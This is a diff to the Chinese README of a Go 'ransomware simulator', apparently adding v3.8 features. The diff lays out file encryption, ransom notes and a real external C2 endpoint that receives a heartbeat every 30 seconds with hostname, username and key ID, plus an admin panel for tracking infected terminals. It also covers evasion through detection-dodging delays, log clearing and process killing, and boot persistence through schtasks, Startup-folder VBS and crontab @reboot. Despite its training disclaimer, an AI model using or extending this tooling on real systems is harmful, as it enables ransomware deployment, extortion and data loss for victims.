@@ -1,12 +1,23 @@
 # 勒索软件模拟器 (Ransomware Simulator)
 
-[![Go](https://img.shields.io/badge/Go-1.24+-00ADD8?style=flat&logo=go)](https://golang.org) [![License: MIT](https://img.shields.io/badge/License-MIT-yellow.svg)](https://opensource.org/licenses/MIT) ![Version](https://img.shields.io/badge/Version-v3.7-blue.svg)
+[![Go](https://img.shields.io/badge/Go-1.24+-00ADD8?style=flat&logo=go)](https://golang.org) [![License: MIT](https://img.shields.io/badge/License-MIT-yellow.svg)](https://opensource.org/licenses/MIT) ![Version](https://img.shields.io/badge/Version-v3.8-blue.svg)
 
 > **⚠️ 安全警告**：本工具仅用于网络安全培训和防御研究。禁止用于非法用途。使用前请确保在隔离环境中运行！
 
 ## 🚀 项目概述
 
 这是一个用于红队演练和防御研究的勒索软件模拟器，模拟真实勒索软件的行为模式，包括文件加密、勒索信生成、C2通信等关键攻击链环节。项目遵循MIT许可证，旨在帮助安全团队测试防御方案和进行安全意识培训。
+
+### 🆕 v3.8 更新摘要
+
+- **断网可用性**：API 不可用时直接回退本地公钥，兼容 `public_key*.pem` / 任意 `*.pem`（自动提取 UUID 或按公钥指纹生成）与用户级密钥缓存；实在找不到密钥时给出中文提示并停留窗口，不再“闪退”
+- **终端心跳**：客户端启动即上报，之后每 30 秒一次，正常退出补发 `stop`
+- **在线管理后台**：`/admin` 查看在线/离线终端、IP、系统、版本与运行模式（需部署新版 `workers/_worker.js` 并配置 `ADMIN_TOKEN`）
+- **系统设置**：`/admin/settings` 可修改管理登录密钥、密钥接口安全路径、心跳接收密钥与 Turnstile；存 D1、立即生效
+- **后台驻留**：`--resident` 加密完成后保持进程、心跳与单实例锁
+- **密钥保留**：`--keep-key` 密钥常驻内存并写入 `key_cache_<uuid>.json`，程序自身产物不会被扫描、加密或删除
+- **定时任务后台化**：`--delay/--at` 自动脱离终端并在重启后继续有效（Windows 计划任务/启动文件夹，Linux `crontab @reboot`），Linux 无需 `nohup`
+- **多架构**：新增 Windows ARM64、Linux arm64 与 armv7（32 位 ARM）、macOS arm64 产物
 
 ## ✨ 主要功能
 
@@ -15,7 +26,7 @@
 - **多平台支持**：Windows/Linux/macOS 全平台兼容
 - **并发加密处理**：多worker线程优化性能
 - **大文件部分加密**：>1GB 文件自动使用头部+尾部+随机中间块的部分加密策略
-- **密钥获取**：API优先获取密钥，失败自动回退本地公钥文件
+- **密钥获取**：API优先获取密钥，失败自动回退本地公钥文件（v3.8 增强：宽松命名、公钥指纹 UUID、用户级缓存）
 - **浏览器端解密**：通过 Web 页面输入 UUID 后直接在浏览器本地解密 .encrypted 文件
 
 ### 📜 勒索系统
@@ -40,9 +51,13 @@
 - **隐身模式** (`--stealth-mode`)：禁用看门狗、断开数据库连接、清除缓存
 - **行为控制** (`--no-stop-services`、`--no-kill-procs`、`--no-clear-logs`)：可跳过各阶段破坏性操作
 - **隐身延迟** (`--aggressive-delay`)：操作间随机延迟，规避行为检测
+- **后台驻留** (`--resident`)：加密完成后进程不退出，保持心跳与单实例锁，Ctrl+C 结束（v3.8）
+- **密钥保留** (`--keep-key`)：密钥常驻内存并写入本地缓存，任务结束、`-remove`、再次扫描都不会删除（v3.8）
 
 ### ⏰ 定时触发（v3.7）
 - **进程内定时**：`--delay`（等待时长）/ `--at`（绝对时刻），等待期间保持单实例锁并打印 ETA，支持 Ctrl+C 中断
+- **自动后台化**：使用 `--delay/--at` 时自动脱离终端转入后台（Windows 脱离控制台，Linux/macOS `setsid`），终端可安全关闭，**Linux 不再需要 `nohup`**；`--foreground` 可保持前台等待
+- **开机自启**：自动注册开机自启（Windows 计划任务 / 启动文件夹，Linux/macOS `crontab @reboot`），**重启后定时任务依旧有效**；`--no-autostart` 可关闭
 - **随机抖动**：`--random-delay` 在定时基础上叠加 `0~X` 随机延迟，打乱固定时序特征
 - **系统级计划任务**：`--persist-schedule` 注册任务后主进程退出，到点由系统唤起（Windows `schtasks`；Linux/macOS `systemd-run` → `at` → `crontab`），执行结束可用 `--schedule-cleanup` 自动清理
 
@@ -59,10 +74,10 @@
 - **安全护栏**：默认只做连通性 + 投递演练且远端以 `-dry-run` 运行，必须显式 `--remote-confirm` 才会真实执行；`-remove` 不会自动透传
 - **报告输出**：逐主机状态表 + `remote_report_<ts>.json`，远端日志回收到控制端程序目录
 
-### 🔗 C2 通信
-- **Beacon 心跳**：通过 Cloudflare Worker 发送加密状态心跳
+### 🔗 C2 通信（v3.8）
+- **终端心跳**：客户端每 30 秒向 Cloudflare Worker 上报一次，管理后台据此判断在线状态
+- **在线管理后台**：`/admin` 查看在线终端、IP、系统、版本、运行模式与最后心跳时间
 - **密钥远程下发**：通过 Workers API 获取 RSA 密钥对
-- **状态上报**：加密完成后上报统计信息
 
 ### 📊 日志与审计
 - **详细日志记录**：成功/失败文件分别记录
@@ -147,11 +162,19 @@ chmod +x build_macos.sh
 
 | 文件 | 平台 | 说明 |
 | --- | --- | --- |
-| `ransom_simulator.exe` | Windows | x86_64 加密端 |
-| `decryptor.exe` | Windows | x86_64 解密端 |
-| `ransom_simulator_linux` | Linux | x86_64 动态链接加密端 |
-| `ransom_simulator_linux_static` | Linux | x86_64 静态链接加密端 |
+| `ransom_simulator.exe` | Windows x86_64 | 加密端 |
+| `ransom_simulator_arm64.exe` | Windows ARM64 | 加密端 |
+| `decryptor.exe` | Windows x86_64 | 解密端 |
+| `decryptor_arm64.exe` | Windows ARM64 | 解密端 |
+| `ransom_simulator_linux` | Linux x86_64 | 动态链接加密端 |
+| `ransom_simulator_linux_static` | Linux x86_64 | 静态链接加密端 |
+| `ransom_simulator_linux_arm64` | Linux arm64 | 动态链接加密端 |
+| `ransom_simulator_linux_arm64_static` | Linux arm64 | 静态链接加密端 |
+| `ransom_simulator_linux_arm` | Linux armv7 | 动态链接加密端（32 位 ARM） |
+| `ransom_simulator_linux_arm_static` | Linux armv7 | 静态链接加密端（32 位 ARM） |
+| `decryptor_linux` / `_arm64` / `_arm` | Linux | 各架构解密端 |
 | `ransom_simulator_macos` | macOS | 通用二进制（amd64 + arm64） |
+| `ransom_simulator_macos_arm64` | macOS Apple Silicon | arm64 单架构加密端 |
 
 - **Windows**: `build/windows/*.exe`
 - **Linux**: `build/linux/*`
@@ -191,10 +214,15 @@ ransom_simulator.exe -log -workers=4
 | --no-kill-procs    | bool   | 跳过终止进程操作                  | ✅       | ✅     | ✅     | false        | 避免 process kill 行为特征           |
 | --no-clear-logs    | bool   | 跳过清除日志操作                  | ✅       | ✅     | ✅     | false        | 避免日志清除行为触发告警             |
 | --aggressive-delay | int    | 各操作间随机延迟上限（毫秒）      | ✅       | ✅     | ✅     | 0            | 打乱行为时序，降低检测特征，0=不延迟 |
-| --delay            | duration | 启动前等待时长（如 `30s`/`5m`/`2h`） | ✅       | ✅     | ✅     | 0            | 进程内定时，等待期间打印 ETA，可 Ctrl+C 中断 |
-| --at               | string | 定时启动时刻                      | ✅       | ✅     | ✅     | 空           | `2006-01-02 15:04:05`、`15:04`（已过则次日）、RFC3339 |
+| -resident          | bool   | 加密完成后驻留后台                | ✅       | ✅     | ✅     | false        | 保持心跳与单实例锁，Ctrl+C 或结束进程退出 |
+| -keep-key          | bool   | 密钥保存在内存与本地缓存          | ✅       | ✅     | ✅     | false        | 写入 `key_cache_<uuid>.json`；扫描/加密/删除均跳过 |
+| -heartbeat-token   | string | 心跳接收密钥                      | ✅       | ✅     | ✅     | 环境变量 `RANSOM_HEARTBEAT_TOKEN` | 后台启用“心跳接收密钥”后必填，随心跳发送 `X-Heartbeat-Token` |
+| --delay            | duration | 启动前等待时长（如 `30s`/`5m`/`2h`） | ✅       | ✅     | ✅     | 0            | 定时启动，默认自动转入后台；`--foreground` 可保持前台 |
+| --at               | string | 定时启动时刻                      | ✅       | ✅     | ✅     | 空           | `2006-01-02 15:04:05`、`15:04`（已过则次日）、RFC3339；默认自动后台化 |
 | --random-delay     | duration | 在定时基础上叠加 0~X 随机抖动     | ✅       | ✅     | ✅     | 0            | 规避固定时序特征                     |
 | --persist-schedule | bool   | 注册系统级定时任务                | ✅       | ✅     | ✅     | false        | Win：`schtasks`；Linux/macOS：`systemd-run`→`at`→`crontab` |
+| --foreground       | bool   | 定时任务保持前台等待              | ✅       | ✅     | ✅     | false        | 默认自动后台化（setsid/脱离控制台） |
+| --no-autostart     | bool   | 不注册开机自启                    | ✅       | ✅     | ✅     | false        | 重启后需手动启动；默认自动注册 |
 | --schedule-task-name | string | 定时任务名称                     | ✅       | ✅     | ✅     | RansomSimTask | 同名任务会被覆盖重建                |
 | --schedule-cleanup | bool   | 任务执行结束后自动清理任务        | ✅       | ✅     | ✅     | true         | 避免残留持久化痕迹                   |
 | --scan             | bool   | 启用攻击面侦察                    | ✅       | ✅     | ✅     | false        | 并发 TCP 端口发现 + 本机资产发现      |
@@ -293,15 +321,39 @@ MIIBIjANBgkqhkiG9w0BAQEFAAOCAQ8AMIIBCgKCAQEAwL6+M4l4R/6mZRZz9cLr
     避免双击运行时窗口一闪而过
   - `-dry-run` 演习模式只提示、不中止，仍可查看将被加密的文件清单
 
-### 3. Beacon 心跳
+### 3. 终端心跳与在线管理
 
-  加密完成后，程序向 C2 服务器发送 Beacon 心跳：
+  程序启动后（阶段 2）立即上报一次心跳，之后每 **30 秒**上报一次，正常退出时补发一次 `stop`：
 
 ```
-GET/POST https://encrypt.yangzifun.org/beacon_check_in
+POST https://encrypt.yangzifun.org/api/heartbeat
+Content-Type: application/json
+
+{
+  "id": "终端稳定指纹（主机名 + 系统 + 架构 + 用户名）",
+  "hostname": "PC-ALICE",
+  "username": "alice",
+  "os": "windows",
+  "arch": "amd64",
+  "version": "v3.8",
+  "mode": "dry-run | attack | remote | stealth",
+  "key_uuid": "本次运行使用的加密密钥 UUID",
+  "pid": 1234,
+  "uptime_s": 3600,
+  "event": "start | ping | stop"
+}
 ```
 
-  服务器记录来源 IP、User-Agent、时间戳等 IOC 信息。
+  服务端把终端记录写入 D1 `terminals` 表；**超过 90 秒**未收到心跳即判定离线。管理后台地址：
+
+```
+https://encrypt.yangzifun.org/admin
+```
+
+  > 兼容说明：旧版客户端仍可使用 `GET/POST /beacon_check_in`，该端点仅记录日志、不参与在线统计。
+  >
+  > 若在管理后台“系统设置”里启用了**心跳接收密钥**，客户端需加 `--heartbeat-token <密钥>`（或环境变量 `RANSOM_HEARTBEAT_TOKEN`），
+  > 请求会携带 `X-Heartbeat-Token`；未携带或错误将返回 401。
 
 ## 🎯 使用场景示例
 
@@ -437,6 +489,21 @@ ransom_simulator.exe -log --remote-hosts-file targets.txt --remote-user Administ
 
 > 说明：默认（未加 `--remote-confirm`）只做连通性 + 投递演练，远端以 `-dry-run` 运行；远端目标目录默认为暂存目录下的沙箱 `target`，避免误伤真实数据。
 
+### 场景14：加密后驻留与密钥保留
+
+```bash
+# Linux
+./ransom_simulator_linux -log -dir="/tmp/test_data" -keep-key -resident
+```
+
+```cmd
+:: Windows
+ransom_simulator.exe -log -dir="D:\test" -keep-key -resident
+```
+
+> 加密完成后进程保持驻留并持续上报心跳（管理后台显示在线），密钥同时保留在内存与
+> `key_cache_<uuid>.json`；按 `Ctrl+C` 结束驻留。缓存文件不会被删除，也不会被后续扫描/加密。
+
 ## 🔧 技术细节
 
 ### 密钥获取策略
@@ -446,6 +513,32 @@ ransom_simulator.exe -log --remote-hosts-file targets.txt --remote-user Administ
 3. **UUID 管理**：API 模式由服务端生成 UUID；本地模式从文件名提取，文件名不含 UUID 时按公钥指纹生成
 4. **完全离线**：本地密钥模式无需网络连接，可在隔离环境中使用
 5. **可观测**：控制台输出当前使用的密钥来源；找不到密钥时给出可操作提示并停留窗口
+
+### 后台驻留与密钥保留
+
+  默认情况下程序在任务结束后倒计时退出。使用 `--resident` 与 `--keep-key` 可让加密后的进程继续驻留并长期持有密钥：
+
+  **`--resident`（后台驻留）**
+
+  - 加密与远程编排结束后不退出，继续以 30 秒间隔上报心跳，管理后台持续显示该终端在线
+  - 保持单实例锁，重复启动会因锁冲突直接退出
+  - 控制台打印驻留摘要（PID、密钥 UUID、缓存路径、心跳状态）
+  - 退出方式：`Ctrl+C` 或结束进程；每 5 分钟写入一条驻留状态日志（`-log` 时）
+
+  **`--keep-key`（密钥保留）**
+
+  - **内存**：`rememberKey` 将 UUID 与公钥 PEM 常驻进程内存，驻留期间不释放
+  - **缓存**：写入程序目录 `key_cache_<uuid>.json`；同时写入用户级缓存目录
+    （Windows：`%AppData%\RansomSimulator\keys\`；Linux/macOS：`~/.config/RansomSimulator/keys/`），文件权限 `0600`
+  - **缓存内容**：`uuid`、`public_key_pem`、`created_at`、`mode`、`remove_original`、`version`
+  - **不被删除**：`public_key*.pem`、`key_cache_*.json`、勒索信、壁纸、日志与侦察/远程报告等程序自身产物，
+    在扫描阶段即被跳过，因此 `-dir` 全格式加密模式与 `-remove` 都不会加密或删除它们
+  - 用途：断网回退、演练审计、与解密流程（私钥仍在服务端或离线私钥文件）对照
+
+  ```cmd
+  :: 加密后驻留后台，并把密钥保存在内存与本地缓存
+  ransom_simulator.exe -log -dir="D:\test" -keep-key -resident
+  ```
 
 ### 攻击技术
 
@@ -553,16 +646,36 @@ ransom_simulator.exe -log --remote-hosts-file targets.txt --remote-user Administ
 | 时序混淆          | `--aggressive-delay=3000`         | 🟢 增强隐蔽 |
 | 完整阶段2（默认） | 无额外参数                        | 🔴 高风险   |
 
-### 定时触发（v3.7）
+### 定时触发与后台驻留
 
-  程序支持两种粒度的定时能力，二者可组合使用：
+  程序支持三种定时方式：
 
-| 模式        | 参数                                   | 行为                                                                 |
-| ----------- | -------------------------------------- | -------------------------------------------------------------------- |
-| 进程内定时  | `--delay` / `--at` / `--random-delay`  | 进程常驻等待，保持单实例锁，逐秒打印 ETA，Ctrl+C / SIGTERM 可中断     |
-| 系统级任务  | `--persist-schedule`                   | 注册任务后主进程立即退出，到点由操作系统唤起（可跨重启、跨登录会话） |
+| 模式 | 参数 | 行为 |
+| ---- | ---- | ---- |
+| 自动后台定时（默认） | `--delay` / `--at` / `--random-delay` | 计算绝对触发时刻后自动脱离终端转入后台，父进程打印 PID 与日志路径后退出；到期执行，结束后按 `--schedule-cleanup` 清理 |
+| 前台等待 | 追加 `--foreground` | 保持旧行为：终端内逐秒打印 ETA 等待，Ctrl+C 中断 |
+| 系统级任务 | `--persist-schedule` | 注册一次性系统任务后主进程退出，到点由操作系统唤起 |
 
-  **平台实现：**
+  **自动后台化：**
+
+  - Windows：以 `DETACHED_PROCESS` 脱离控制台、隐藏窗口；Linux/macOS：以 `setsid` 脱离会话
+  - 输出重定向到 `<程序目录>/scheduler.log`；父进程立即返回，终端可安全关闭
+  - **Linux/macOS 不依赖 `nohup` / screen / tmux**
+  - 启动时后台子进程会重试获取单实例锁，避免与父进程冲突
+
+  **重启后依旧有效（默认自动注册开机自启）：**
+
+| 平台 | 自启方式 | 说明 |
+| ---- | -------- | ---- |
+| Windows | 计划任务 `ONSTART`（管理员） → `ONLOGON` → 启动文件夹 VBS | 前两种需要权限，失败自动回退到当前用户启动文件夹，无需管理员 |
+| Linux / macOS | `crontab @reboot` | 重启后自动拉起后台子进程，到点执行（目标时间已过则立即执行） |
+
+  - 任务完成后写入 `.schedule_done_<任务名>` 并删除自启项（`--schedule-cleanup=true` 默认开启），避免重启后重复执行
+  - `--no-autostart` 关闭开机自启（重启后需手动启动）；`--foreground` 关闭后台化
+
+  **参数透传规则**：后台/计划任务会剔除 `--delay/--at/--random-delay/--persist-schedule/--schedule-cleanup/--schedule-task-name/--foreground/--no-autostart`，追加绝对时间 `--at <RFC3339>` 与内部标记（`--daemon-child` 或 `--scheduled-run`），确保子进程不会二次后台化、不会重复注册。
+
+  **平台实现（`--persist-schedule`）：**
 
 | 平台        | 注册方式                                                            | 触发后清理                     |
 | ----------- | ------------------------------------------------------------------- | ------------------------------ |
@@ -570,9 +683,7 @@ ransom_simulator.exe -log --remote-hosts-file targets.txt --remote-user Administ
 | Linux       | `systemd-run --on-calendar=<时间> --unit=<任务名>`（先系统级，失败再 `--user`），无 systemd 时回退 `at`，再回退 `crontab` | systemd 瞬时 timer 触发后自动回收；crontab 由包装脚本自删 |
 | macOS       | `at`（需启用 `atrun`），否则 `crontab`                              | 同上（crontab 包装脚本自删）    |
 
-  **参数透传规则**：注册任务时会自动剔除 `--delay/--at/--random-delay/--persist-schedule/--schedule-cleanup/--schedule-task-name`，并追加内部标记 `--scheduled-run`，确保被唤起的进程不再次进入等待、并在结束时按 `--schedule-cleanup` 清理任务。
-
-  > 注意：Windows `schtasks /sc once` 只能指定「时刻」而不能指定日期，因此目标时间超过 24 小时时会直接报错并回退为进程内等待；跨天场景请使用 `--delay` 或系统级任务管理器自行编排。
+  > 注意：Windows `schtasks /sc once` 只能指定「时刻」而不能指定日期，因此目标时间超过 24 小时时会直接报错并回退为进程内等待；跨天场景建议直接使用默认的自动后台定时（`--delay` / `--at`），它通过后台进程 + 开机自启实现跨重启。
 
 ### 攻击面侦察（模拟攻击扫描，v3.7）
 
@@ -653,7 +764,7 @@ ransom_simulator.exe -log --remote-hosts-file targets.txt --remote-user Administ
 
 ```
   =================== 勒索软件模拟器日志 ===================
-  程序版本: v3.7
+  程序版本: v3.8
   开始时间: 2026-07-31 14:30:25
   运行参数: ./ransom_simulator_linux -log -workers 4
   工作目录: /home/user/tools
@@ -763,19 +874,26 @@ ransom_simulator.exe -log --remote-hosts-file targets.txt --remote-user Administ
 
 | 路径               | 请求方法     | 服务说明                                                     | 校验/权限          |
 | :----------------- | :----------- | :----------------------------------------------------------- | :----------------- |
-| `/`                | `GET`        | **密钥管理中心主页**：UI 包含在线密钥生成、UUID 密钥查询及统计趋势图表 | 公开               |
+| `/`                | `GET`        | **ransom_simulator 主页**：UI 包含在线密钥生成、UUID 密钥查询及统计趋势图表 | 公开               |
 | `/decrypt`         | `GET`        | **浏览器端在线解密页面**：零上传纯前端解密工具               | 公开               |
 | `/{SECRET_PATH}`   | `POST`       | **安全路径密钥生成**（默认 `/E56dSY`）：客户端自动化调用     | 隐秘路径校验       |
 | `/api/generate`    | `POST`       | **前端公共密钥生成**：Web UI 手动生成密钥接口                | Turnstile 人机验证 |
 | `/query`           | `GET`        | **密钥查询接口**：根据 UUID 查询私钥与公钥                   | 公开               |
 | `/stats`           | `GET`        | **统计数据接口**：获取累积生成量与历史趋势数据               | 公开               |
-| `/beacon_check_in` | `GET`/`POST` | **C2 Beacon 心跳端点**：接收并记录客户端打卡日志             | 公开               |
+| `/api/heartbeat`   | `POST`       | **终端心跳上报**：客户端每 30 秒调用，写入 D1 `terminals` 表 | 公开               |
+| `/admin`           | `GET`        | **终端在线管理后台**：在线/离线统计与终端列表（10s 自动刷新） | `ADMIN_TOKEN` 登录 |
+| `/admin/login`     | `POST`       | 管理后台登录（表单，成功后写入 HttpOnly Cookie）             | 管理令牌           |
+| `/admin/logout`    | `POST`       | 管理后台退出登录（清除 Cookie）                              | 管理令牌           |
+| `/admin/api/terminals` | `GET` | 管理接口：终端列表 JSON（Cookie 或 `Bearer` 令牌鉴权）       | `ADMIN_TOKEN`      |
+| `/admin/api/terminals/delete` | `POST` | 管理接口：移除终端记录                              | `ADMIN_TOKEN`      |
+| `/admin/settings`  | `GET`/`POST` | **系统设置**：登录密钥、密钥接口路径、心跳密钥、Turnstile | 管理会话/`ADMIN_TOKEN` |
+| `/beacon_check_in` | `GET`/`POST` | **旧版 Beacon 端点**：仅记录打卡日志，不参与在线统计        | 公开               |
 
 ---
 
 ### ⚙️ 端点详细说明
 
-#### GET / （密钥管理中心主页）
+#### GET / （ransom_simulator 主页）
 
   > 完整 URL：https://encrypt.yangzifun.org/
   >
@@ -870,11 +988,111 @@ curl "https://encrypt.yangzifun.org/stats?range=1m"
 | ------- | ---------------------- | ----------------------- |
 | `range` | `1m`, `3m`, `6m`, `1y` | 统计时间范围（默认 1m） |
 
-#### GET/POST /beacon_check_in （C2 Beacon 心跳端点）
+#### GET/POST /beacon_check_in （旧版 C2 Beacon 端点）
 
   > 完整 URL：https://encrypt.yangzifun.org/beacon_check_in
   >
-  > 用于模拟器上线/加密完成的心跳打卡。服务端在 Cloudflare Worker 控制台实时打印包含 `CF-Connecting-IP`、`User-Agent` 及时间戳的 JSON 告警日志。
+  > 兼容旧版客户端的打卡端点，仅打印包含 `CF-Connecting-IP`、`User-Agent` 及时间戳的 Worker 日志，**不参与在线统计**。
+
+#### POST /api/heartbeat （终端心跳上报）
+
+  > 完整 URL：https://encrypt.yangzifun.org/api/heartbeat
+
+```bash
+curl -X POST https://encrypt.yangzifun.org/api/heartbeat \
+  -H "Content-Type: application/json" \
+  -d '{"id":"5f0c…","hostname":"PC-ALICE","username":"alice","os":"windows","arch":"amd64","version":"v3.8","mode":"dry-run","event":"ping"}'
+```
+
+```json
+{
+  "status": "ok",
+  "server_time": 1794302563,
+  "interval": 30,
+  "online_window": 90
+}
+```
+
+  服务端按 `id` 做 upsert：首次上报记录 `first_seen`，之后每次刷新 `last_seen`、`heartbeat_count`、来源 IP/地区；`event: "stop"` 会立即把终端标记为离线。表由 Worker 首次写入时自动创建。
+
+#### GET /admin （终端在线管理后台）
+
+  > 完整 URL：https://encrypt.yangzifun.org/admin
+  >
+  > 需在 Worker 中配置 `ADMIN_TOKEN` 环境变量（`wrangler secret put ADMIN_TOKEN`）作为初始/回退登录密钥，未配置时返回 503 并提示配置方法。
+
+  - 顶部统计：在线 / 离线 / 终端总数
+  - 列表字段：状态、主机名与终端 ID、用户、系统、版本与运行模式、IP 与地区、最后心跳（相对时间 + 绝对时间）、心跳次数
+  - 每 10 秒自动刷新，支持搜索过滤、手动刷新、移除终端、退出登录
+  - 鉴权：登录后写入 `HttpOnly + Secure + SameSite=Strict` 的 `admin_session` Cookie（7 天有效，服务端仅存 SHA-256 摘要）；接口也支持 `Authorization: Bearer <ADMIN_TOKEN>`
+  - 登录密钥可在 `/admin/settings` 修改（PBKDF2-SHA256 哈希存 D1）；修改后所有会话立即失效
+
+#### GET /admin/api/terminals （终端列表 JSON）
+
+```bash
+curl "https://encrypt.yangzifun.org/admin/api/terminals" \
+  -H "Authorization: Bearer $ADMIN_TOKEN"
+```
+
+```json
+{
+  "status": "success",
+  "server_time": 1794302563,
+  "online_window": 90,
+  "heartbeat_interval": 30,
+  "summary": { "total": 3, "online": 2, "offline": 1 },
+  "terminals": [
+    {
+      "id": "5f0c…",
+      "hostname": "PC-ALICE",
+      "username": "alice",
+      "os": "windows",
+      "arch": "amd64",
+      "version": "v3.8",
+      "mode": "dry-run",
+      "key_uuid": "…",
+      "ip": "203.0.113.9",
+      "country": "CN",
+      "first_seen": 1794300000,
+      "last_seen": 1794302550,
+      "heartbeat_count": 85,
+      "online": true,
+      "seconds_since_last_seen": 13
+    }
+  ]
+}
+```
+
+#### POST /admin/api/terminals/delete （移除终端）
+
+```bash
+curl -X POST "https://encrypt.yangzifun.org/admin/api/terminals/delete" \
+  -H "Authorization: Bearer $ADMIN_TOKEN" \
+  -H "Content-Type: application/json" \
+  -d '{"id":"5f0c…"}'
+```
+
+#### GET /admin/settings （系统设置页）
+
+  > 完整 URL：https://encrypt.yangzifun.org/admin/settings
+  >
+  > 需先登录管理后台（`admin_session` Cookie 或 `Authorization: Bearer <登录密钥>`）。
+
+  可管理的变量（保存到 D1 `settings` 表，立即生效；留空表示保持当前值）：
+
+  | 变量 | 说明 |
+  | --- | --- |
+  | **管理登录密钥** | 修改后台登录密钥（PBKDF2-SHA256 哈希存储）；保存后所有会话失效，需用新密钥重新登录；可勾选“清除自定义密钥”回退到环境变量 `ADMIN_TOKEN` |
+  | `secret_path` | 密钥接口安全路径（优先于 `env.SECRET_PATH`）；修改后客户端硬编码的 `apiURL` 需同步更新 |
+  | `heartbeat_token` | 心跳接收密钥；启用后客户端必须携带 `X-Heartbeat-Token`，否则心跳返回 401 |
+  | `turnstile_site_key` / `turnstile_secret_key` | 网页生成密钥的 Turnstile 人机验证；未配置时不校验 |
+
+  ```bash
+  # 通过 API 查看当前生效配置（不含密钥明文）
+  curl "https://encrypt.yangzifun.org/admin/settings" -H "Authorization: Bearer $ADMIN_TOKEN"
+  ```
+
+  > 登录密钥与其它变量保存在同一次提交中：先保存其它变量，再变更登录密钥并跳转登录页。
 
 ---
 
@@ -888,6 +1106,12 @@ curl "https://encrypt.yangzifun.org/stats?range=1m"
 
   - **`keys` 表**：保存加密生成的密钥对历史记录（字段：`uuid`, `public_key`, `private_key`, `rid`, `created_at`）。
   - **`key_metrics` 表**：持久化保存统计指标（字段：`total_generated`, `latest_uuid`, `latest_generated_at`），即使 `keys` 表清理定期数据，累计生成总量亦不会重置。
+  - **`terminals` 表**：终端在线状态（字段：`id`, `hostname`, `username`, `os`, `arch`, `version`, `mode`, `key_uuid`, `ip`, `country`, `user_agent`, `first_seen`, `last_seen`, `heartbeat_count`, `online`）。由 Worker 首次收到心跳时自动创建，无需手工建表。
+  - **`settings` 表**：后台可维护的变量（字段：`key`, `value`, `updated_at`），保存登录密钥哈希、密钥接口路径、心跳密钥与 Turnstile 配置；由 Worker 自动创建。
+  - **`admin_sessions` 表**：管理后台登录会话（字段：`id`（会话令牌 SHA-256 摘要）, `created_at`, `expires_at`）；登录时自动清理过期会话，修改登录密钥时全部失效。
+
+  > 终端记录不会自动删除；如需清理长期离线终端，可执行：
+  > `DELETE FROM terminals WHERE last_seen < CAST(strftime('%s','now') AS INTEGER) - 2592000;`（保留最近 30 天）
 
 #### 2. 环境变量 (Environment Variables)
 
@@ -896,6 +1120,13 @@ curl "https://encrypt.yangzifun.org/stats?range=1m"
 | `SECRET_PATH`          | `E56dSY` | 客户端自动化请求密钥的安全路径（不含前导斜杠 `/`）         |
 | `TURNSTILE_SITE_KEY`   | *(可选)* | 前端 Turnstile Widget 部件 Site Key                        |
 | `TURNSTILE_SECRET_KEY` | *(可选)* | 后端校验 Turnstile Token 的 Secret Key（未设置时跳过校验） |
+| `ADMIN_TOKEN`          | *(建议设置)* | **初始/回退**管理登录密钥；在 `/admin/settings` 设置自定义登录密钥后以 D1 为准（哈希存储），清除自定义密钥后回退到此变量；未配置且 D1 无哈希时 `/admin` 返回 503 |
+
+  配置管理令牌：
+
+```bash
+wrangler secret put ADMIN_TOKEN
+```
 
 ### 重要注意事项
 
